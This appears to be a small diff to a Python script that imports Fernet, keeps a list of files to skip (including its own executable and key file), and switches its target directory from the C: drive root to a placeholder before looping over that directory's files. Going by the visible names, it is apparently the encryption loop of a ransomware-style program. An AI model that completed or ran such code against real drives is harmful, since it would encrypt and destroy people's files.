@@ -29,10 +29,10 @@ from cryptography.fernet import Fernet
 
 files = []
 safe_files = ["key_storage.py", "encryption_matrix.py"]
-skip_files = ["encrypt.exe", "encrypt.py", "encrypt.key"]
+skip_files = ["encrypt.exe", "encrypt.py", "encrypt.key", "full_script.py"]
 reference_value = "a98def102bbc7a81320c"
 
-os.chdir("C:/")
+os.chdir("<path>") # <-- change path here
 
 for file in os.listdir():
     if file in skip_files:
